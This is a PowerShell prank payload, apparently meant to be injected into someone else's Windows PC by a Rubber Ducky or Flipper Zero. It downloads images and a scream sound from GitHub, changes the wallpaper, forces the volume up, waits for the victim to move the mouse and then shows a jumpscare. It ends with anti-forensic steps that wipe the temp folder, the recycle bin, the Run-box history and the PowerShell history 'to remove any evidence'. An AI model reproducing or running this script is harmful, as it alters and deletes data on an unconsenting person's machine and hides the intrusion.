<# Download Images #>

## Fakeout cute image
$image =  "https://raw.githubusercontent.com/Ta0hit/FlipperZero/refs/heads/main/RubberDucky-JumpScare/cat.png"
$c = -join($image,"?dl=1")
iwr $c -O $env:TMP\c.png
iwr https://raw.githubusercontent.com/Ta0hit/FlipperZero/refs/heads/main/RubberDucky-JumpScare/cat.png?dl=1 -O $env:TMP\c.png

## Jumpscare
$image =  "https://raw.githubusercontent.com/Ta0hit/FlipperZero/refs/heads/main/RubberDucky-JumpScare/jumpscare.png"
$i = -join($image,"?dl=1")
iwr $i -O $env:TMP\i.png
iwr https://raw.githubusercontent.com/Ta0hit/FlipperZero/refs/heads/main/RubberDucky-JumpScare/jumpscare.png?dl=1 -O $env:TMP\i.png

# Download WAV file
$wav = "https://github.com/Ta0hit/FlipperZero/blob/main/RubberDucky-JumpScare/female_scream.wav?raw=true"
$w = -join($wav,"?dl=1")
iwr $w -O $env:TMP\s.wav

#----------------------------------------------------------------------------------------------------

# This will take the image downloaded and set it as the wallpaper

Function Set-WallPaper {
 
<#
 
    .SYNOPSIS
    Applies a specified wallpaper to the current user's desktop
    
    .PARAMETER Image
    Provide the exact path to the image
 
    .PARAMETER Style
    Provide wallpaper style (Example: Fill, Fit, Stretch, Tile, Center, or Span)
  
    .EXAMPLE
    Set-WallPaper -Image "C:\Wallpaper\Default.jpg"
    Set-WallPaper -Image "C:\Wallpaper\Background.jpg" -Style Fit
  
#>

 
param (
    [parameter(Mandatory=$True)]
    # Provide path to image
    [string]$Image,
    # Provide wallpaper style that you would like applied
    [parameter(Mandatory=$False)]
    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
    [string]$Style
)
 
$WallpaperStyle = Switch ($Style) {
  
    "Fill" {"10"}
    "Fit" {"6"}
    "Stretch" {"2"}
    "Tile" {"0"}
    "Center" {"0"}
    "Span" {"22"}
  
}
 
If($Style -eq "Tile") {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
 
}
Else {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
 
}
 
Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;
  
public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@ 
  
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
  
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
  
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}
 
#----------------------------------------------------------------------------------------------------
 
# This is to pause the script until a mouse movement is detected

function Pause-Script {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o=New-Object -ComObject WScript.Shell

    while(1) {
        $pauseTime = 3
        if([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

#----------------------------------------------------------------------------------------------------

# This is to play the WAV file
function Play-WAV {
    $PlayWav=New-Object System.Media.SoundPlayer
    $PlayWav.SoundLocation="$env:TMP\s.wav";$PlayWav.playsync()
}

#----------------------------------------------------------------------------------------------------

<# This handles user volume #>

# Check if computer is muted - it it is, unmute it
$m = Get-WmiObject -Namespace root\cimv2 -Class Win32_SoundDevice
if($m.Volume -eq 0) {
    $m.SetDefaultAudioEndpoint(1, 1)
}

# This lowers the volume to 0% and then back up to 50%
$o=New-Object -ComObject WScript.Shell

# This lowers the volume to 0%
for($i = 0; $i -lt 50; $i++) {
    $o.SendKeys([char] 174)  # Volume down key
}

# Increase volume by 50%
$k=[Math]::Ceiling(50/2)  
for($i = 0; $i -lt $k; $i++) {
    $o.SendKeys([char] 175)  # Volume up key
}

#----------------------------------------------------------------------------------------------------

Set-WallPaper -Image "$env:TMP\c.png" -Style Center
Pause-Script
Set-WallPaper -Image "$env:TMP\i.png" -Style Center
Play-WAV

#----------------------------------------------------------------------------------------------------

<# This is to clean up and remove any evidence to prove you were there #>

# Delete contents of Temp folder 
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

#----------------------------------------------------------------------------------------------------

# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 

Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true) {
$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
